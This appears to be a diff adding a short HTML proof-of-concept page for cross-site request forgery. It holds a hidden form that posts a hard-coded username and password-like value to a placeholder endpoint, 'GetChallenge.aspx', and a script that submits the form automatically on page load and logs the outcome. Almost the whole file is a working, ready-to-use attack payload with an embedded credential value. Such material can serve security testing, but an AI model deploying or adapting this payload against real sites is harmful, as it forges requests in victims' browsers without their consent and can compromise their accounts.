@@ -1,0 +1,16 @@
+<form method="POST" action="https://your-site.com/GetChallenge.aspx" id="csrfForm">
+    <input type="hidden" name="txtADUer" value="drake">
+    <input type="hidden" name="txtADPass" value="whoops13200@">
+    <input type="submit">
+</form>
+<script>
+    console.log("🔍 Attempting to submit CSRF form...");
+    
+    // Try submitting the form
+    try {
+        document.forms[0].submit();
+        console.log("✅ CSRF form submitted!");
+    } catch (error) {
+        console.error("❌ Error submitting CSRF form:", error);
+    }
+</script>
